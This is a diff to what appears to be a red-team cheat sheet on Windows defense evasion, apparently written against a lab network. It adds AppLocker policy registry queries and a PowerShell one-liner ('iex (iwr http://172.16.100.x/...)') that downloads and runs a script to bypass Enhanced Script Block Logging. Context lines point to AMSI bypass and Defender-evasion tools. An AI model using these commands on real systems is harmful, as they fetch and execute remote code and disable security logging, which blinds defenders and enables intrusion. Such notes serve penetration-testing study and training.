@@ -69,7 +69,7 @@ Get-ModifiableService -Verbose
 
 
 
-## **AV / Defender  Bypass**
+## **Bypass AV / Defender / Applocker / Enhanced Script Block Logging**
 
 **AMSI Bypass**\
 ****amsi.fail
@@ -110,8 +110,22 @@ $ExecutionContext.SessionState.LanguageMode
 {% code overflow="wrap" %}
 ```powershell
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\....
 ```
 {% endcode %}
+
+**Bypasses Enhanced Script Block Logging**
+
+```powershell
+iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
+
+or paste the content of sbloggingbypass.txt
+
+```
+
+****
 
 **Identify Code/Strings Defender may flag**\
 https://github.com/matterpreter/DefenderCheck => C# without builds\
